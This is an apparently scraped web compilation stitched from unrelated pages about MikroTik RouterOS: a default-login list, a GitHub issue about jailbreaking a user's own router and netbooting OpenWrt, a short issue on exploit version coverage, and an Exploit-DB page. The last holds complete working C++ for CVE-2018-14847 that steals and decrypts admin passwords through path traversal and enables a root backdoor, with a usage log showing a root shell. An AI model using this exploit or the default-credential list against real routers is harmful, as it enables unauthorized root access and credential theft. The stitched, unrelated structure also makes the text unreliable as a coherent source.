MikroTik v6.43.5 (stable)
Login:MIKROTIK ROUTER OS Default Router Login and Password
Toggle navigation
Default Router Settings
From Dan's Tools
Web Dev
HTML/JS/CSS PlaygroundHTML Color CodesCSS FontsOnline Diff Tool.htaccess GeneratorJavascript Error LoggerRegEx TestingRGB to HEX Color ConverterTimeStamp ConverterWebsite Speed TestFavicon.ico & App Icon GeneratorOnline Image EditorCSS Sprite GeneratorAdblock Monitor & NotificationKeyword Tool
Conversion
Data
CSV To HTML ConverterCSV To JSON ConverterCSV To TSV ConverterCSV To XML ConverterJSON To CSV ConverterJSON To HTML ConverterJSON To TSV ConverterJSON To XML ConverterXML To CSV ConverterXML To HTML ConverterXML To JSON ConverterXML To TSV ConverterConvert Files
Numbers
Binary ConverterBinary To Decimal ConverterBinary To Hex ConverterBinary To Octal ConverterUnit ConverterDecimal To Binary ConverterDecimal To Hex ConverterDecimal To Octal ConverterHex To Binary ConverterHex To Decimal ConverterHex To Octal ConverterData Size ConverterOctal To Binary ConverterOctal To Decimal ConverterOctal To Hex Converter
Strings
Binary To String ConverterHex To String ConverterHTML Entities EscapeHTML Entities UnescapeString To Binary ConverterString To Hex ConverterStrip and Remove HTML TagsStrip and Remove XML TagsWord CounterXML Entities EscapeXML Entities Unescape
Encode/Decoders
Base64 DecodeBase64 EncodeMD5 Hash GeneratorSHA-1 Hash GeneratorSHA-256 Hash GeneratorSHA-512 Hash GeneratorURL Encode/Decode
Formatters
CSS FormatterGO FormatterHTML Beautifier & FormatterJavascript FormatterJavascript ObfuscateJSON Formatter & BeautifierJSON EditorJSON ValidatorPerl FormatterPHP FormatterPython FormatterRuby FormatterSQL FormatterXML Formatter & BeautifierCSS MinifyJavascript MinifyJSON Minify
Internet
Email ValidatorExplain Linux CommandsIs It Up Or DownMAC Address SearchDefault Router SettingsUser ManualsWhat is my IP
JoinLogin
MIKROTIK ROUTER OS Default Router Login and Password
Factory Default Settings for the Mikrotik Router OS
60%
Username:adminPassword:(none)IP Address:N/A SSID:N/A Most Common MIKROTIK LoginsUsername / Passwordadmin / none48%admin / 30%admin / 7%admin / admin6%none / none3%admin / (none)1%admin / ''blank''1%rfnet / admin1%hakeri / 1234561%Detected Devices Retry Detecting Routers
Most Common MIKROTIK IPs192.168.88.192%192.168.0.2543%189.150.32.112%172.16.0.12%192.168.18.12%
Tips or Questions?
PostPosting GuidelinesFormatting - Now
Follow @danstools00
© 2014-2019 Dan's Tools | About | Privacy | Poconos Rentals | Tesla Referral Code
×Close
Login
If you don't already have an account, Register Now
Close
×Close
Join
Join to access discussion forums and premium features of the site.
Close
×Close
Please Share!
Thank you for using my tool.
If you could share this tool with your friends, that would be a huge help:
Tweet
Or follow us to learn about our latest tools:
Follow @danstools00
Closedocumenting attempts against v6.42.2 · Issue #6 · 0ki/mikrotik-tools · GitHub
Skip to content
Why GitHub?
Features →
Code review
Project management
Integrations
Actions
Package registry
Team management
Social coding
Documentation
Code hosting
Customer stories →
Security →
Enterprise
Explore
Explore GitHub →
Learn & contribute
Topics
Collections
Trending
Learning Lab
Open source guides
Connect with others
Events
Community forum
GitHub Education
Marketplace
Pricing
Plans →
Compare plans
Contact Sales
Nonprofit →
Education →
In this repository
All GitHub
↵
Jump to
↵
No suggested jump to results
In this repository
All GitHub
↵
Jump to
↵
In this repository
All GitHub
↵
Jump to
↵
Sign in
Sign up
Watch
45
Star
248
Fork
94
0ki/mikrotik-tools
Code
Issues
1
Pull requests
0
Projects
0
Security
Insights
Dismiss
Join GitHub today
GitHub is home to over 36 million developers working together to host and review code, manage projects, and build software together.
Sign up
New issue
Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.
Pick a username
Email Address
Password
Sign up for GitHub
By clicking “Sign up for GitHub”, you agree to our terms of service and
privacy statement. We’ll occasionally send you account related emails.
Already on GitHub?
Sign in
to your account
documenting attempts against v6.42.2
#6
Closed
tkellen
opened this issue
May 19, 2018
· 13 comments
Closed
documenting attempts against v6.42.2
#6
tkellen
opened this issue
May 19, 2018
· 13 comments
Comments
Assignees
No one assigned
Labels
None yet
Projects
None yet
Milestone
No milestone
2 participants
Copy link
Quote reply
tkellen
commented
May 19, 2018
•
edited
Device: Mikrotik hEX RB750gr3
Firmware: 6.42.2
Reproduction from a fresh clone of this repo, under the exploit-backup folder:
ssh admin@192.168.88.1 '/system backup save name=jailbreak dont-encrypt=yes'
Configuration backup saved
scp admin@192.168.88.1:/jailbreak.backup ./jailbreak.backup
jailbreak.backup
100%
17KB
3.5MB/s
00:00
./exploit_b.py jailbreak.backup
Done. Now restore from jailbreak.backup.
scp admin@192.168.88.1:/jailbreak.backup ./jailbreak.backup
jailbreak.backup
100%
17KB
3.7MB/s
00:00
ssh admin@192.168.88.1 '/system backup load name=jailbreak password=""'
System configuration restored, rebooting now
After reboot:
➜ telnet 192.168.88.1
Trying 192.168.88.1...
Connected to 192.168.88.1.
Escape character is '^]'.
MikroTik v6.42.2 (stable)
Login: devel
Password:
Login failed, incorrect username or password
Reading #2 it seems like the file pckg/option needs to exist (is that a typo for pkg/option)?
Tried to add thusly:
➜ sftp admin@192.168.88.1 <<END
mkdir pckg
mkdir pckg/option
END
Connected to admin@192.168.88.1.
sftp> mkdir pckg
sftp> mkdir pckg/option
Same behavior following:
➜ telnet 192.168.88.1
Trying 192.168.88.1...
Connected to 192.168.88.1.
Escape character is '^]'.
MikroTik v6.42.2 (stable)
Login: devel
Password:
Login failed, incorrect username or password
Just noticed the code in the VirtualBox appliance is totally different than what is in the source tree here. Tried it out. It correctly detects my device IP, plays some tones, instructs me to swap cables and then hangs on waiting for device to boot (it does reboot).
Any suggestions on a path forward @0ki? I'm going to start digging into the code for the exploit in the appliance tomorrow to see if I can understand why it is getting hung up.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 19, 2018
PS: thanks for sharing all of this @0ki!
For a bit more context, I'm hoping to run https://github.com/coreos/matchbox on this router for a demo cluster based on @andyshinn's kuberdoo project.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 19, 2018
Also, ping @NimdaKey who I see has been working with this project as recently as a few days ago.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Owner
0ki
commented
May 21, 2018
Virtual appliance supports only MIPSBE/AR9344 devices. All you need to do is compile netboot for MT7621A and put it in the appliance. Upload it to github, so we can share the love and provide support for additional hardware.
/pkcg/option is not a typo, but it needs to exists in the root folder (/). sftp is jailed of course.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
•
edited
Finally getting back around to this. Thanks for the pointer @0ki. Just cloned https://github.com/openwrt/openwrt and am giving that a shot now. Happy to share the result--any suggestions on how to go about that? Unless I am misreading things, the code in the appliance (and associated kernels/etc) are not a part of this repo?
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
In related news, it might be possible to simplify the appliance substantially using these tools:
https://github.com/google/netboot/tree/master/pixiecore
https://github.com/jhaals/waitron
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
•
edited
I've replaced /srv/tftp/initram with https://downloads.openwrt.org/releases/17.01.4/targets/ramips/mt7621/lede-17.01.4-ramips-mt7621-rb750gr3-initramfs-kernel.bin in the appliance.
Running /root/init.sh, IP is detected, reboot (with netboot enabled) is triggered, I switch the network cable to the first port, the appliance hangs on waiting for device to boot. Not sure how to tell definitively if the router is pxe booting without a monitor... will follow up with more details the next time I get a chance to look at this.
Anything obvious I am missing @0ki?
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
So, I have two network adapters attached to my laptop, one in port #1 of the mikrotik, one in port #2 (here is a subset of running ip addr)
7: enp0s20f0u1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 00:e0:4c:68:06:01 brd ff:ff:ff:ff:ff:ff
inet 192.168.7.1/24 scope global enp0s20f0u1
valid_lft forever preferred_lft forever
8: enp57s0u2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 00:e0:4c:68:01:34 brd ff:ff:ff:ff:ff:ff
inet 192.168.88.253/24 brd 192.168.88.255 scope global dynamic noprefixroute enp57s0u2
valid_lft 480sec preferred_lft 480sec
inet6 fe80::b1e2:8989:928a:17/64 scope link noprefixroute
valid_lft forever preferred_lft forever
Here I am confirming the device is set to attempt a netboot:
➜ ssh admin@192.168.88.1 "/system routerboard settings set boot-device=try-ethernet-once-then-nand"
➜ ssh admin@192.168.88.1 "/system routerboard settings print"
auto-upgrade: no
boot-device: try-ethernet-once-then-nand
cpu-frequency: 880MHz
memory-frequency: 1200DDR
boot-protocol: bootp
force-backup-booter: no
silent-boot: no
protected-routerboot: disabled
reformat-hold-button: 20s
reformat-hold-button-max: 10m
➜ ssh admin@192.168.88.1 "/system reboot"
Here is my config for dnsmasq:
interface=enp0s20f0u1
listen-address=192.168.7.1
dhcp-range=192.168.7.2,192.168.7.2,1m
enable-tftp
tftp-root=/home/tkellen/sources/netboot/tftp
dhcp-vendorclass=set:pxe,PXEClient
dhcp-vendorclass=set:mikrotik_mips,Mips_boot
dhcp-vendorclass=set:mikrotik_generic,udhcp 1
dhcp-host=*:*:*:*:*:*,192.168.7.2
dhcp-option=option:router
dhcp-option=option:dns-server
dhcp-boot=initram
log-queries
...and the output of sudo dnsmasq -d -C config during a reboot:
dnsmasq: started, version 2.79 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect inotify
dnsmasq-dhcp: DHCP, IP range 192.168.7.2 -- 192.168.7.2, lease time 2m
dnsmasq-tftp: TFTP root is /home/tkellen/sources/netboot/tftp
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.0.1#53
dnsmasq: read /etc/hosts - 7 addresses
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.0.1#53
dnsmasq: using nameserver 192.168.88.1#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.0.1#53
dnsmasq-dhcp: BOOTP(enp0s20f0u1) 192.168.7.2 cc:2d:e0:38:de:ec
dnsmasq-dhcp: DHCPDISCOVER(enp0s20f0u1) cc:2d:e0:38:de:ec
dnsmasq-dhcp: DHCPOFFER(enp0s20f0u1) 192.168.7.2 cc:2d:e0:38:de:ec
dnsmasq-dhcp: DHCPREQUEST(enp0s20f0u1) 192.168.7.2 cc:2d:e0:38:de:ec
dnsmasq-dhcp: DHCPACK(enp0s20f0u1) 192.168.7.2 cc:2d:e0:38:de:ec MikroTik
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
Setting boot-protocol to DHCP kicked off a TFTP transfer of initram. Trying the same in the appliance now!
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
...still stuck in waiting for device to boot. Back to running this directly from my machine and stepping through the process. I suppose I need to confirm netboot is actually working by trying to ssh into the router after a pxe boot.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
•
edited
Now able to netboot to OpenWRT using the instructions in section "Replacing U-Boot Using LEDE" of this page
Of note, I had to revert to c089671 of http://github.com/openwrt/openwrt for the instructions to work (returning to a commit where linux-4.9 support was still available for this hardware).
Unfortunately, I can't mount the flash drive to continue the jailbreak.
root@OpenWrt:~# mount /dev/mtdblock3 /mnt
mount: mounting /dev/mtdblock3 on /mnt failed: Invalid argument
root@OpenWrt:~# mount -t jffs2 /dev/mtdblock3 /mnt
...yields the following:
[
223.368780] jffs2: Further such events for this erase block will not be printed
[
223.389502] jffs2: Old JFFS2 bitmask found at 0x000f5ee0
[
223.394805] jffs2: You cannot use older JFFS2 filesystems with newer kernels
[
223.424386] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100000: 0x4550 instead
[
223.433842] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100004: 0xb87a instead
[
223.443296] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100008: 0x4b5a instead
[
223.452756] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x0010000c: 0xd660 instead
[
223.462216] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100010: 0x05c6 instead
[
223.471676] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100014: 0xf425 instead
[
223.481139] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100018: 0xe580 instead
[
223.490599] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x0010001c: 0x5fb7 instead
[
223.500066] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100020: 0x8ca6 instead
[
223.509501] jffs2: jffs2_scan_eraseblock(): Magic bitmask 0x1985 not found at 0x00100024: 0xfca6 instead
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
https://forum.lede-project.org/t/how-to-install-to-rb750gr3/4654/30
Unfortunately Mikrotik use a version of a very old JFFS2 which just doesn’t work with the later kernels. You’d have to take the jffs filesystem tree from the Mikrotik kernel and replace the one in the later kernel with it, making the appropriate patches. I did attempt this many moons ago and got it to work, but unfortunately don’t have any of that code ( it was a real mess. )
Don't think I'll be taking this any further. Thanks for the insight, @sidepipe!
tkellen
closed this
May 28, 2018
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Author
tkellen
commented
May 28, 2018
Here's the netbootable kernel for anyone we who may stumble upon this and find value in it.
vmlinux-initramfs.elf.gz
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Owner
0ki
commented
May 28, 2018
Yes, we actually tried LEDE and hit the same roadblock earlier. We even tried compiling some userspace code for jffs. I think this is actually relatively doable, if one has the right amount of commitment. Thank you for taking the time that you did!
Sign up for free
to join this conversation on GitHub.
Already have an account?
Sign in to comment
© 2019 GitHub, Inc.
Terms
Privacy
Security
Status
Help
Contact GitHub
Pricing
API
Training
Blog
About
You can’t perform that action at this time.
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.Exploit on RouterOS v6.42.2 · Issue #30 · BasuCert/WinboxPoC · GitHub
Skip to content
Why GitHub?
Features →
Code review
Project management
Integrations
Actions
Package registry
Team management
Social coding
Documentation
Code hosting
Customer stories →
Security →
Enterprise
Explore
Explore GitHub →
Learn & contribute
Topics
Collections
Trending
Learning Lab
Open source guides
Connect with others
Events
Community forum
GitHub Education
Marketplace
Pricing
Plans →
Compare plans
Contact Sales
Nonprofit →
Education →
In this repository
All GitHub
↵
Jump to
↵
No suggested jump to results
In this repository
All GitHub
↵
Jump to
↵
In this repository
All GitHub
↵
Jump to
↵
Sign in
Sign up
Watch
31
Star
276
Fork
221
BasuCert/WinboxPoC
Code
Issues
3
Pull requests
1
Projects
0
Security
Insights
Dismiss
Join GitHub today
GitHub is home to over 36 million developers working together to host and review code, manage projects, and build software together.
Sign up
New issue
Have a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.
Pick a username
Email Address
Password
Sign up for GitHub
By clicking “Sign up for GitHub”, you agree to our terms of service and
privacy statement. We’ll occasionally send you account related emails.
Already on GitHub?
Sign in
to your account
Exploit on RouterOS v6.42.2
#30
Closed
Aldeab
opened this issue
Jan 21, 2019
· 4 comments
Closed
Exploit on RouterOS v6.42.2
#30
Aldeab
opened this issue
Jan 21, 2019
· 4 comments
Comments
Assignees
No one assigned
Labels
None yet
Projects
None yet
Milestone
No milestone
3 participants
Copy link
Quote reply
Aldeab
commented
Jan 21, 2019
Exploit the vulnerability" is still work on v6.42.2 or not?
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Contributor
Deantwo
commented
Jan 21, 2019
Please read the readme.
Here: README.md
Vulnerable Versions
All RouterOS versions from 2015-05-28 to 2018-04-20 are vulnerable to this exploit.
Mikrotik devices running RouterOS versions:
Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
For more information see: https://blog.mikrotik.com/security/winbox-vulnerability.html
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Contributor
Deantwo
commented
Jan 21, 2019
•
edited
If you need a TL;DR version: No the RouterOS stable version 6.42.2 is not vulnerable to the exploit.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Contributor
Deantwo
commented
Jan 23, 2019
If you want proof, you can download this PoC script and test it yourself.
This comment has been minimized.
Sign in to view
Copy link
Quote reply
Contributor
Deantwo
commented
Jan 23, 2019
@mosajjal, can you just close this?
mosajjal
closed this
Jan 23, 2019
Sign up for free
to join this conversation on GitHub.
Already have an account?
Sign in to comment
© 2019 GitHub, Inc.
Terms
Privacy
Security
Status
Help
Contact GitHub
Pricing
API
Training
Blog
About
You can’t perform that action at this time.
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.MicroTik RouterOS < 6.43rc3 - Remote Root
Exploit Database
Exploits
GHDB
Papers
Shellcodes
Search EDB
SearchSploit Manual
Submissions
Online Training
PWK
Penetration Testing with Kali
AWAE
Advanced Web Attacks
WiFu
Wireless Attacks
Offsec Resources
Stats
About Us
About Exploit-DB
Exploit-DB History
FAQ
Search
GET CERTIFIED
MicroTik RouterOS < 6.43rc3 - Remote Root
EDB-ID:
45578
CVE:
2018-14847
EDB Verified:
Author:
Jacob Baines
Type:
remote
Exploit:
/
Platform:
Hardware
Date:
2018-10-10
Vulnerable App:
Become a Certified Penetration Tester
Enroll in
Penetration Testing with Kali Linux
, the course
required to become an
Offensive Security Certified Professional (OSCP)
GET CERTIFIED
/*
# Exploit Title: RouterOS Remote Rooting
# Date: 10/07/2018
# Exploit Author: Jacob Baines
# Vendor Homepage: www.mikrotik.com
# Software Link: https://mikrotik.com/download
# Version: Longterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3
# Tested on: RouterOS Various
# CVE : CVE-2018-14847
By the Way is an exploit coded in C++ that enables a root shell on Mikrotik devices running RouterOS versions:
Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
The exploit can be found here: https://github.com/tenable/routeros/tree/master/poc/bytheway
The exploit leverages the path traversal vulnerability CVE-2018-14847 to extract the admin password and create an "option" package to enable the developer backdoor. Post exploitation the attacker can connect to Telnet or SSH using the root user "devel" with the admin's password.
Mikrotik patched CVE-2018-14847 back in April. However, until this PoC was written, I don't believe its been publicly disclosed that the attack can be levegered to write files. You can find Mikrotik's advisory here:
https://blog.mikrotik.com/security/winbox-vulnerability.html
Note that, while this exploit is written for Winbox, it could be ported to HTTP as long as you had prior knowledge of the admin credentials.
# Usage Example
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password:
Login failed, incorrect username or password
Connection closed by foreign host.
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ ./btw -i 192.168.1.251
╔╗ ┬ ┬
┌┬┐┬ ┬┌─┐
╦ ╦┌─┐┬ ┬
╠╩╗└┬┘
│ ├─┤├┤
║║║├─┤└┬┘
╚═╝ ┴
┴ ┴ ┴└─┘
╚╩╝┴ ┴ ┴
[+] Extracting passwords from 192.168.1.251:8291
[+] Searching for administrator credentials
[+] Using credentials - admin:lol
[+] Creating /pckg/option on 192.168.1.251:8291
[+] Creating /flash/nova/etc/devel-login on 192.168.1.251:8291
[+] There's a light on
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password:
BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.
# uname -a
Linux MikroTik 3.3.5 #1 Thu Mar 2 08:16:25 UTC 2017 mips unknown
# cat /rw/logs/VERSION
v6.38.4 Mar/08/2017 09:26:17
# Connection closed by foreign host.
*/
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include "winbox_session.hpp"
#include "winbox_message.hpp"
#include "md5.hpp"
namespace
{
const char s_version[] = "By the Way 1.0.0";
/*!
* Parses the command line arguments. The program will always use two
* parameters (ip and winbox port) but the port will default to 8291 if
* not present on the CLI
*
* \param[in] p_arg_count the number of arguments on the command line
* \param[in] p_arg_array the arguments passed on the command line
* \param[in,out] p_ip the ip address to connect to
* \param[in,out] p_winbox_port the winbox port to connect to
* \return true if we have valid ip and ports. false otherwise.
*/
bool parseCommandLine(int p_arg_count, const char* p_arg_array[],
std::string& p_ip, std::string& p_winbox_port)
{
boost::program_options::options_description description("options");
description.add_options()
("help,h", "A list of command line options")
("version,v", "Display version information")
("winbox-port,w", boost::program_options::value<std::string>()->default_value("8291"), "The winbox port")
("ip,i", boost::program_options::value<std::string>(), "The ip to connect to");
boost::program_options::variables_map argv_map;
try
{
boost::program_options::store(
boost::program_options::parse_command_line(
p_arg_count, p_arg_array, description), argv_map);
}
catch (const std::exception& e)
{
std::cerr << e.what() << "\n" << std::endl;
std::cerr << description << std::endl;
return false;
}
boost::program_options::notify(argv_map);
if (argv_map.empty() || argv_map.count("help"))
{
std::cerr << description << std::endl;
return false;
}
if (argv_map.count("version"))
{
std::cerr << "Version: " << ::s_version << std::endl;
return false;
}
if (argv_map.count("ip") && argv_map.count("winbox-port"))
{
p_ip.assign(argv_map["ip"].as<std::string>());
p_winbox_port.assign(argv_map["winbox-port"].as<std::string>());
return true;
}
else
{
std::cerr << description << std::endl;
}
return false;
}
/*!
* This function uses the file disclosure vulnerability, CVE-2018-14847, to
* download the user database from /flash/rw/store/user.dat
*
* \param[in] p_ip the address of the router to connect to
* \param[in] p_winbox_port the winbox port to connect to
* \return a string containing the user.dat data or an empty string on error
*/
std::string getPasswords(const std::string& p_ip, const std::string& p_winbox_port)
{
std::cout << "[+] Extracting passwords from " << p_ip << ":" << p_winbox_port << std::endl;
Winbox_Session winboxSession(p_ip, p_winbox_port);
if (!winboxSession.connect())
{
std::cerr << "[!] Failed to connect to the remote host" << std::endl;
return std::string();
}
WinboxMessage msg;
msg.set_to(2, 2);
msg.set_command(7);
msg.set_request_id(1);
msg.set_reply_expected(true);
msg.add_string(1, "//./.././.././../flash/rw/store/user.dat");
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
{
std::cerr << "[!] Error receiving an open file response." << std::endl;
return std::string();
}
boost::uint32_t sessionID = msg.get_session_id();
boost::uint16_t file_size = msg.get_u32(2);
if (file_size == 0)
{
std::cerr << "[!] File size is 0" << std::endl;
return std::string();
}
msg.reset();
msg.set_to(2, 2);
msg.set_command(4);
msg.set_request_id(2);
msg.set_reply_expected(true);
msg.set_session_id(sessionID);
msg.add_u32(2, file_size);
winboxSession.send(msg);
msg.reset();
if (!winboxSession.receive(msg))
{
std::cerr << "[!] Error receiving a file content response." << std::endl;
return std::string();
}
return msg.get_raw(0x03);
}
/*!
* Looks through the user.dat file for an enabled administrative account that
* we can use. Once a useful account is found the password is decrypted.
*
* \param[in] p_user_dat the user.dat file data
* \param[in,out] p_username stores the found admin username
* \param[in,out] p_password stores the found admin password
* \return true on success and false otherwrise
*/
bool get_password(const std::string p_user_dat, std::string& p_username, std::string& p_password)
{
std::cout << "[+] Searching for administrator credentials " << std::endl;
// the dat file is a series of nv::messages preceded by a two byte length
std::string dat(p_user_dat);
while (dat.size() > 4)
{
boost::uint16_t length = *reinterpret_cast<const boost::uint16_t*>(&dat[0]);
if (dat[2] != 'M' || dat[3] != '2')
{
// this is mild insanity but the .dat file messages don't line
// up properly if a new user is added or whatever.
dat.erase(0, 1);
continue;
}
dat.erase(0, 4);
length -= 4;
if (length > dat.size())
{
return false;
}
std::string entry(dat.data(), length);
dat.erase(0, length);
WinboxMessage msg;
msg.parse_binary(entry);
// we need an active admin account
// 0x2 has three groups: 1 (read), 2 (write), 3 (full)
if (msg.get_u32(2) == 3 && msg.get_boolean(0xfe000a) == false)
{
p_username.assign(msg.get_string(1));
std::string encrypted_pass(msg.get_string(0x11));
if (!encrypted_pass.empty() && msg.get_u32(0x1f) != 0)
{
std::string hash_this(p_username);
hash_this.append("283i4jfkai3389");
MD5 md5;
md5.update(hash_this.c_str(), hash_this.size());
md5.finalize();
std::string md5_hash(md5.getDigest());
for (std::size_t i = 0; i < encrypted_pass.size(); i++)
{
boost::uint8_t decrypted = encrypted_pass[i] ^ md5_hash[i % md5_hash.size()];
if (decrypted == 0)
{
// a null terminator! We did it.
return true;
}
p_password.push_back(decrypted);
}
p_password.clear();
}
}
}
return false;
}
}
/*!
* This function creates the file /pckg/option on the target. This will enable
* the developer login on Telnet and SSH. Oddly, you'll first need to log in
* to Telnet for SSH to work, but I digress...
*
* \param[in] p_ip the ip address of the router
* \param[in] p_port the port of the jsproxy we'll connect to
* \param[in] p_username the username we'll authenticate with
* \param[in] p_password the password we'll authenticate with
* \return true if we successfully created the file.
*/
bool create_file(const std::string& p_ip, const std::string& p_port,
const std::string& p_username, const std::string& p_password)
{
Winbox_Session mproxy_session(p_ip, p_port);
if (!mproxy_session.connect())
{
std::cerr << "[-] Failed to connect to the remote host" << std::endl;
return false;
}
boost::uint32_t p_session_id = 0;
if (!mproxy_session.login(p_username, p_password, p_session_id))
{
std::cerr << "[-] Login failed." << std::endl;
return false;
}
std::cout << "[+] Creating /pckg/option on " << p_ip << ":" << p_port << std::endl;
WinboxMessage msg;
msg.set_to(2, 2);
msg.set_command(1);
msg.set_request_id(1);
msg.set_reply_expected(true);
msg.set_session_id(p_session_id);
msg.add_string(1, "//./.././.././../pckg/option");
mproxy_session.send(msg);
msg.reset();
mproxy_session.receive(msg);
if (msg.has_error())
{
std::cout << "[-] " << msg.get_error_string() << std::endl;
return false;
}
std::cout << "[+] Creating /flash/nova/etc/devel-login on " << p_ip << ":" << p_port << std::endl;
msg.reset();
msg.set_to(2, 2);
msg.set_command(1);
msg.set_request_id(2);
msg.set_reply_expected(true);
msg.set_session_id(p_session_id);
msg.add_string(1, "//./.././.././../flash/nova/etc/devel-login");
mproxy_session.send(msg);
msg.reset();
mproxy_session.receive(msg);
if (msg.has_error())
{
std::cout << "[-] " << msg.get_error_string() << std::endl;
return false;
}
return true;
}
int main(int p_argc, const char** p_argv)
{
std::string ip;
std::string winbox_port;
if (!parseCommandLine(p_argc, p_argv, ip, winbox_port))
{
return EXIT_FAILURE;
}
std::cout << std::endl;
std::cout << "
╔╗ ┬ ┬
┌┬┐┬ ┬┌─┐
╦ ╦┌─┐┬ ┬" << std::endl;
std::cout << "
╠╩╗└┬┘
│ ├─┤├┤
║║║├─┤└┬┘" << std::endl;
std::cout << "
╚═╝ ┴
┴ ┴ ┴└─┘
╚╩╝┴ ┴ ┴ " << std::endl;
std::cout << std::endl;
// step one - do the file disclosure
std::string user_dat(getPasswords(ip, winbox_port));
if (user_dat.empty())
{
return EXIT_FAILURE;
}
// step two - parse the password
std::string admin_username;
std::string admin_password;
if (!get_password(user_dat, admin_username, admin_password))
{
std::cout << "[-] Failed to find admin creds. Trying default." << std::endl;
admin_username.assign("admin");
admin_password.assign("");
}
std::cout << "[+] Using credentials - " << admin_username << ":" << admin_password << std::endl;
// step three - create the file
if (!create_file(ip, winbox_port, admin_username, admin_password))
{
return EXIT_FAILURE;
}
std::cout << "[+] There's a light on" << std::endl;
return EXIT_SUCCESS;
}
Tags:
Remote
Advisory/Source:
Link
Downloads
Certifications
Training
Professional Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Advanced Web Attacks and Exploitation (AWAE)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Offensive Security Wireless Attacks (WiFu)
Application Security Assessment
OSEE
Cracking the Perimeter (CTP)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux Training
Downloads
Kali Linux
Kali NetHunter
Kali Linux Revealed Book
Certifications
OSCP
OSWP
OSCE
OSEE
OSWE
KLCP
Training
Penetration Testing with Kali Linux (PWK)
Advanced Web Attacks and Exploitation (AWAE)
Offensive Security Wireless Attacks (WiFu)
Cracking the Perimeter (CTP)
Metasploit Unleashed (MSFU)
Free Kali Linux training
Pro Services
Penetration Testing
Advanced Attack Simulation
Application Security Assessment
Exploit Database by Offensive Security
Terms
Privacy
About Us
FAQ
©
Copyright 2019, Exploit Database
About The Exploit Database
×
The Exploit Database is maintained by Offensive Security, an information security training company
that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
non-profit project that is provided as a public service by Offensive Security.
The Exploit Database is a CVE
compliant archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.
The Google Hacking Database (GHDB)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.
The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
